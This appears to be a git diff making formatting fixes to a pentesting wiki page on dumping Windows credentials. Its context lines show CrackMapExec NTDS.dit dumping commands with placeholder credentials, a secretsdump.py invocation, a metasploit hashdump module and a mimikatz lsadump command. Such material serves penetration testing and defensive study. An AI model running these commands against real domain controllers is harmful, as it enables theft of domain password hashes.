@@ -112,7 +112,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-### Dump the NTDS.dit password history from target DC&#x20;
+### Dump the NTDS.dit password history from target DC
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
@@ -238,7 +238,7 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 
 For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`&#x20;
+Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
 
 ## Lazagne
 
@@ -279,4 +279,4 @@ Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco
 
 ## Defenses
 
-****[**Learn about some credentials protections here.**](credentials-protections.md)****
+[**Learn about some credentials protections here.**](credentials-protections.md)
